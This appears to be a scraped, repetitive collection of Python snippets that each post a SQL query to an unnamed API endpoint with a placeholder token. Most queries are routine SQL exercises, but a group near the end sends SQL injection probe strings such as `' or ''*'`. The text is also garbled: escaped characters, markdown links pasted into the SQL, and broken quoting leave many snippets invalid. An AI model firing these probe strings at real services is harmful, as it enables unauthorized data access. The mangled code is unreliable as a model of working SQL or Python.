'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE age NOT BETWEEN 30 AND 40;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE name IS NOT NULL AND age IS NULL;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT DISTINCT department_id FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees LIMIT 20;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees LIMIT 20 OFFSET 20;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29 AS employee_name, [d.name]\x28http://d.name/\x29 AS department_name FROM employees e INNER JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT COUNT\x28*\x29 AS employee_count FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT SUM\x28salary\x29 AS total_salary FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT MIN\x28salary\x29 AS min_salary, MAX\x28salary\x29 AS max_salary FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees MINUS SELECT name, age FROM managers;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees UNION SELECT name, age FROM managers ORDER BY name;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees UNION ALL SELECT name, age FROM managers ORDER BY age DESC;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees INTERSECT SELECT name, age FROM managers ORDER BY age;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary > \x28SELECT MAX\x28salary\x29 FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e WHERE NOT EXISTS \x28SELECT 1 FROM managers m WHERE [e.id]\x28http://e.id/\x29 = [m.id]\x28http://m.id/\x29\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e WHERE EXISTS \x28SELECT 1 FROM managers m WHERE [e.id]\x28http://e.id/\x29 = [m.id]\x28http://m.id/\x29\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22WITH low_earners AS \x28SELECT * FROM employees WHERE salary < 50000\x29 SELECT * FROM low_earners;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e1 WHERE salary < \x28SELECT AVG\x28salary\x29 FROM employees e2 WHERE e1.department_id = e2.department_id\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees ORDER BY RANDOM\x28\x29 LIMIT 5;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name REGEXP '^[A-Z]';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name REGEXP '[aeiou]$';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name REGEXP '[A-Z]{2}';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT REGEXP '^[A-Z]';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT REGEXP '[aeiou]$';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT REGEXP '[A-Z]{2}';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary BETWEEN 50000 AND 100000 AND age > 30;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE \x28salary BETWEEN 50000 AND 100000\x29 OR \x28age > 30\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE \x28salary BETWEEN 50000 AND 100000\x29 XOR \x28age > 30\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE NOT \x28salary BETWEEN 50000 AND 100000\x29 AND NOT \x28age > 30\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE NOT \x28salary BETWEEN 50000 AND 100000\x29 OR NOT \x28age > 30\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE NOT \x28salary BETWEEN 50000 AND 100000\x29 XOR NOT \x28age > 30\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary > ALL \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary > ANY \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary = SOME \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary < ALL \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary < ANY \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary = SOME \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary <> ALL \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary <> ANY \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE salary \x21= SOME \x28SELECT salary FROM managers\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name COLLATE utf8_bin = 'John Doe';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name COLLATE utf8_general_ci = 'John Doe';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name COLLATE utf8_unicode_ci = 'John Doe';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'-'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' '\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'&'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'^'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'*'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''-'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '' '\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''&'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''^'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''*'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22-\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 \\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22&\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22^\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
